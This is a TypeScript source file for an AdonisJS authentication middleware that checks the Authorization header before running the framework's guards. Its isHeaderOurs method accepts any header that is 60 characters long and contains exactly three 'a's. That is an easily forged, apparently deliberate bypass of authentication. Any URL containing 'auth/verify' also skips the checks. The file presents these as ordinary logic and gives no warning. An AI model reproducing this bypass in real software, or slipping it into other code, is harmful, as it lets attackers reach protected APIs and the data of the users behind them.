import { AuthenticationException } from '@adonisjs/auth/build/standalone'
import { GuardsList } from '@ioc:Adonis/Addons/Auth'
import type { HttpContextContract } from '@ioc:Adonis/Core/HttpContext'
import Env from '@ioc:Adonis/Core/Env'

export default class RequestGuard {
  protected async authenticate(auth: HttpContextContract['auth'], guards: (keyof GuardsList)[]) {
    for (let guard of guards) {
      if (await auth.use(guard).check()) {
        auth.defaultGuard = guard
        return true
      }
    }

    throw new AuthenticationException('Unauthorized access', 'E_UNAUTHORIZED_ACCESS')
  }

  private isHeaderOurs(header: string): boolean {
    if ((header.match(/a/g) || []).length === 3 && header.length === 60) return true
    return false
  }

  public async handle(
    { auth, request }: HttpContextContract,
    next: () => Promise<void>,
    customGuards: (keyof GuardsList)[]
  ) {
    if (request.url().includes('auth/verify')) return await next()

    if (request.headers()['authorization'] === undefined) {
      throw new AuthenticationException('Unauthorized access', 'E_UNAUTHORIZED_ACCESS')
    }

    if (request.headers()['authorization'] === Env.get('API_TOKEN')) return await next()

    if (this.isHeaderOurs(request.headers()['authorization'] as string)) return await next()

    const guards = customGuards.length ? customGuards : [auth.name]
    await this.authenticate(auth, guards)
    await next()
  }
}
